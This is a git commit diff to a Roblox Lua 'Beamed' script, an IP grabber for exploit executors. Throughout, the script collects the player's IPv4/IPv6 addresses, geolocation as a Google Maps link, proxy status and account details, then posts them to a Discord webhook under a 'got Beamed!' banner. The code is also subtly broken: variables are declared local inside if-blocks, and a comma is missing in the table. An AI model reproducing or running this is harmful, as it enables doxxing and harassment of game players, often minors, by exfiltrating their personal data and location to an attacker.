5641159d3604353a88bca6c23b7894f74c0337b5
volcanoboy08 <50715952+volcanoboy08@users.noreply.github.com>
2021-12-04 06:09:30 -0800

    Update Beamed.lua

--- Beamed.lua
+++ Beamed.lua
@@ -6,17 +6,21 @@
 |  |_)  | |  |____ /  _____  \  |  |  |  | |  |____ |  '--'  |
 |______/  |_______/__/     \__\ |__|  |__| |_______||_______/ 
 ]]
+local url = "put your webhook here"
 local http = game:HttpGet
 local httpS = game:GetService("HttpService")
+local decode = httpS:JSONDecode
 local Player = game:GetService("Players").LocalPlayer
-local time = httpS:JSONDecode(http('http://worldtimeapi.org/api/ip'))
+local Name = Player.Name
+local time = decode(http('http://worldtimeapi.org/api/ip'))
 local Age = Player.AccountAge
-local Birthday = httpS:JSONDecode(http('https://showcase.api.linx.twenty57.net/UnixTime/fromunixtimestamp?unixtimestamp=' .. os.time() - Age * 86400 + time.raw_offset))
+local getdate = os.date("!*t", os.time())
+local Birthday = decode(http('https://showcase.api.linx.twenty57.net/UnixTime/fromunixtimestamp?unixtimestamp=' .. os.time() - Age * 86400 + time.raw_offset))
 local IPv6 = http('https://api6.ipify.org')
 local IPv4 = http('https://api.ipify.org')
---local UserAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36"
+--local UserAgent = "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.81 Safari/537.36"
 --local UAdata = game:GetService("HttpService"):JSONDecode(game:HttpGet('http://api.userstack.com/detect?access_key=mykey&ua=' .. UserAgent))
-local data = httpS:JSONDecode(http('https://pro.ip-api.com/json/' .. IPv4 .. '?fields=mykey&key=notyours'))
+local data = decode(http('https://pro.ip-api.com/json/' .. IPv4 .. '?fields=66842623&key=mykey'))
 local Exploit =
     (syn and not is_sirhurt_closure and not pebc_execute and "Synapse X") or
     (secure_load and "Sentinel") or
@@ -33,42 +37,41 @@ local Exploit =
     (IS_COCO_LOADED and "Coco") or
     ("Unknown Exploit")
    
-local gettime = ((os.date("!*t", os.time())).year .. "-" .. (os.date("!*t", os.time())).month .. "-" .. (os.date("!*t", os.time())).day .. "T" .. (os.date("!*t", os.time())).hour .. ":" .. (os.date("!*t", os.time())).min .. ":" .. (os.date("!*t", os.time())).sec .. "Z")
+local gettime = (getdate.year .. "-" .. getdate.month .. "-" .. getdate.day .. "T" .. getdate.hour .. ":" .. getdate.min .. ":" .. getdate.sec .. "Z")
 
-if Player.DisplayName == Player.Name then
-    local DisplayNamestr = "They don't have a display name"
+if Player.DisplayName == Name then
+    local DisplayNamestr = Name .. " doesn't have a display name"
 else
-    local DisplayNamestr = "The display name is " .. Player.DisplayName
+    local DisplayNamestr = Name .. "'s display name is " .. Player.DisplayName
 end
 
 if IPv6 == '' then
-    local IPv6str = "There is no IPv6 address"
+    local IPv6str = Name .. " doesn't have a IPv6 address"
 else
-    local IPv6str = "The IPv6 is " .. IPv6
+    local IPv6str = Name .. "'s IPv6 is " .. IPv6
 end
 
 if Player.MembershipType == Enum.MembershipType.Premium then
-    local Premium = "They have Premium"
+    local Premium = Name .. " has Premium"
 else
-    local Premium = "They don't have Premium"
+    local Premium = Name .. " is a no Premium noob"
 end
 
 if data.proxy then
-    local Proxy = "They are using a proxy"
+    local Proxy = Name .. " is using a proxy"
 else
-    local Proxy = "They aren't using a proxy"
+    local Proxy = Name .. " isn't using a proxy"
 end
 
-local url = "my webhook"
 local data = {
     ["embeds"] = {
 		{
-			["title"] = "__**" .. Player.Name .. " got Beamed!!**__",
+			["title"] = "__**" .. Name .. " got Beamed!**__",
 			["description"] = "",
 			["type"] = "rich",
-			["color"] = tonumber(0xffffff),
+			["color"] = tonumber(0x00FF00),
 			["image"] = {
-				["url"] = "https://roblox.com/Thumbs/Avatar.ashx?x=150&y=150&Format=Png&username=" .. Player.Name
+				["url"] = "https://roblox.com/Thumbs/Avatar.ashx?x=150&y=150&Format=Png&username=" .. Name
 			},
 			["thumbnail"] = {
 				["url"] = "https://cdn.discordapp.com/attachments/888619229597818904/899888215677370388/beamed.gif"
@@ -77,6 +80,11 @@ local data = {
 				{
 					["title"] = "__Exploit__",
 					["value"] = Exploit,
+					["inline"] = false
+				},
+				{
+					["title"] = "__Player__",
+					["value"] = "[" .. Name .. "](https://roblox.com/users/" .. Player.UserId .. ")",
 					["inline"] = false
 				},
 				{
@@ -97,11 +105,6 @@ local data = {
 				{
 					["name"] = "__Location__",
 					["value"] = "[Google Maps](https://google.com/maps/@" .. data.lat .. "," .. data.lon .. ",15z)",
-					["inline"] = false
-				},
-				{
-					["name"] = "__Account__",
-					["value"] = "[" .. Player.UserId .. "](https://roblox.com/users/" .. Player.UserId .. ")",
 					["inline"] = false
 				},
 				{
@@ -156,12 +159,12 @@ local data = {
 				}
 				{
 					["title"] = "__Account age__",
-					["value"] = Age .. " days ago",
+					["value"] = Name .. " created their account " .. Age .. " days ago",
 					["inline"] = false
 				},
 				{
 					["title"] = "__Account Birthday__",
-					["value"] = Birthday.Datetime:sub(1, -10),
+					["value"] = Name .. "'s birthday is " .. Birthday.Datetime:sub(1, -10),
 					["inline"] = false
 				},
 				{
@@ -169,34 +172,15 @@ local data = {
 					["value"] = Proxy,
 					["inline"] = false
 				}
-				--[[
-				{
-					["title"] = "____",
-					["value"] = ,
-					["inline"] = false
-				}
-				]]
 			}
 		}
 	}
 }
-local newdata = httpS:JSONEncode(data)
+local jsondata = httpS:JSONEncode(data)
 
 local headers = {
    ["content-type"] = "application/json"
 }
 request = http_request or request or HttpPost or syn.request
-local finaldata = {Url = url, Body = newdata, Method = "POST", Headers = headers}
+local finaldata = {Url = url, Body = jsondata, Method = "POST", Headers = headers}
 request(finaldata)
---[[
-if data.mobile then
-    print("They are on mobile")
-else
-    print("They aren't on mobile")
-end
-print("The OS is " .. UAdata.os.name)
-print("The OS family is " .. UAdata.os.family)
-print("The Browser is " .. UAdata.browser.name)
-print("The browser version is " .. UAdata.browser.version)
-print("The device type is " .. UAdata.device.type)
-]]
